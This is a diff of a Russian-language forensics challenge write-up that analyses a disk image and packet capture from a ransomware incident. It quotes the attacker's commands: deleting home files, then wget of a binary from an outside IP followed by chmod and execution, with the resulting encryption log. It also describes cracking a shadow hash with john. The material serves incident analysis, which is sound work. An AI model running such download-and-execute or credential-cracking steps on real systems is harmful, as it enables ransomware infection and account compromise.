@@ -5,7 +5,7 @@
 Сначала я увидел `image.img` и `dump.pcapng` (на кали).
 
 Сразу я решил открыть `image.img` через `testdisk` и скопировал себе в папку `image/` некоторые директории из корня:
-`bin.usr-is-merged/`, `home/`, `media/`, `opt/`, `root/`, `tmp/`, `etc/`, `lib.usr-is-merged`, `mnt/`, `proc/`, `sbin.usr-is-merged`, `var/`
+`bin.usr-is-merged/`, `home/`, `media/`, `opt/`, `root/`, `tmp/`, `etc/`, `lib.usr-is-merged/`, `mnt/`, `proc/`, `sbin.usr-is-merged/`, `var/`
 
 Сразу обратил внимание, что в `opt/` есть Addition для VirtualBox (эта информация не пригодилась)
 
@@ -34,11 +34,11 @@ qemu-system-x86_64 \
 
 Далее я создал папку `/mnt/tmp` (на кали) и прописал `sudo losetup --offset 2097152 /dev/loop667 image.img` и `sudo mount /dev/loop667 /mnt/tmp`
 
-Таким образом я скопировал себе `/etc/password` и `/etc/shadow` и попытался узнать пароль от `ioal` с помощью `john`, но, к сожалению, не вышло
+Таким образом я скопировал себе `/etc/password` и `/etc/shadow` и попытался узнать пароль от `ioal` с помощью `john`, но, к сожалению, не вышло (остановил проверку хеша на 58.1% на вордсете `rockyou.txt` (в кали `/usr/share/wordset/rockyou.txt.gz` распаковал через `gunzip` в `/usr/share/wordset/rockyou.txt`))
 
 Тогда я просто решил `sudo chroot /mnt/tmp/` и через `useradd qwerty`, `passwd qwerty` создал себе пользователя, которому через `usermod qwerty -aG sudo` выдал доступ к `sudo` (я потом еще пожалел о том, что сразу не создал `/home/qwerty`, потому что файловый менеджер уничтожил мне виртуалку сообщениями об ошибке)
 
-Я заметил, что хост называется `fileshare`, а так же его айпи:
+Я заметил, что хост называется `fileshare`, а так же его айпи (`ip a`):
 - enp0s2: `10.0.2.15/24` (DNS `10.0.2.3`)
 - br-4d2c7d1f6f87: `172.18.0.1/16`
 - docker0: `172.17.0.1/16`
@@ -123,7 +123,7 @@ cd ../
 cd ioal
 wget http://81.177.221.242:8125/app
 ```
-`wget` пожаловался на то, что директория `app` уже есть (в ней был сервис-докер)
+`rm .*` удалил все файлы в домашней директории, а `wget` пожаловался на то, что директория `app` уже есть (в ней был сервис-докер)
 ```
 ls
 cd ../
@@ -133,6 +133,9 @@ chmod +x app
 ./app
 exit
 ```
+
+С помощью этих команд злоумышленник поднялся в `/home` и запустил шифровальщик
+
 При запуске этот `app` несколько раз написал
 ```
 CUSTOM_write found, patched.
@@ -143,7 +146,7 @@ ok
 Encrypting .//app: Encrypting .//ioal/app/docker-compose.yml: Encrypting .//ioal/app/server/requirements.txt: Encrypting .//ioal/app/server/wait-for-postgres.sh: Encrypting .//ioal/app/server/Dockerfile: Encrypting .//ioal/app/server/templates/index.html: Encrypting .//ioal/app/server/__init__.py: Encrypting .//ioal/app/server/assets/css/listr.pack.css: Encrypting .//ioal/app/server/assets/css/custom.css: Encrypting .//ioal/app/server/assets/css/jquery.filer.css: Encrypting .//ioal/app/server/assets/fonts/fontawesome-webfont.woff: Encrypting .//ioal/app/server/assets/fonts/jquery.filer-icons/jquery-filer.ttf: Encrypting .//ioal/app/server/assets/fonts/jquery.filer-icons/jquery-filer-preview.html: Encrypting .//ioal/app/server/assets/fonts/jquery.filer-icons/jquery-filer.svg: Encrypting .//ioal/app/server/assets/fonts/jquery.filer-icons/jquery-filer.eot: Encrypting .//ioal/app/server/assets/fonts/jquery.filer-icons/jquery-filer.woff: Encrypting .//ioal/app/server/assets/fonts/jquery.filer-icons/jquery-filer.cs
 ```
 
-С помощью этих команд он удалил все файлы в домашней директории `ioal`, после чего поднялся в `/home` и запустил шифровальщик
+Таким образом все оставшиеся файлы в домашней директории и сам `app` были зашифрованы
 
 # Решение задач
 
@@ -153,4 +156,27 @@ Encrypting .//app: Encrypting .//ioal/app/docker-compose.yml: Encrypting .//ioal
 
 ## Задание 2-6
 
-Как настало время решать 2-6 я проконсультировался с `gemini-2.5-pro-exp-03-25` и мне было предложено использовать `hexdump`, где я и увидел сигнатуру `beef dead bade c0fe` во всех зашифрованных файлах
+Как настало время решать 2-6 я скачал `app` себе на кали при помощи таковой функции в wireshark'е (файл -> экспортировать объекты -> HTTP -> text/plain app)
+
+Когда я решил открыть его в `ghidra`, я увидел в конце текст, который потом еще раз увидел при помощи `strings ./app`:
+```
+...
+PROT_EXEC|PROT_WRITE failed.
+_j<X
+$Info: This file is packed with the t
+Z executable packer http://upx.sf.net $
+$Id: t
+Z 4.24 Copyright (C) 1996-2024 the t
+Z Team. All Rights Reserved. $
+_RPWQM)
+j"AZR^j
+PZS^
+/proc/self/exe
+...
+```
+
+Этот `upx` был скачан на кали, но когда я использовал `upx -d ./app` он мне сказал, что не в его кондициях распаковать этот файл
+
+Тогда я решил поэкспериментировать с этим приложением и пошифровал несколько тестовых файлов, но, к сожалению, не в моих силах было разобрать алгоритм шифрования
+
+Проконсультировавшись с `gemini-2.5-pro-exp-03-25` и мне было предложено использовать `hexdump`, где я и увидел сигнатуру `beef dead bade c0fe` во всех зашифрованных файлах
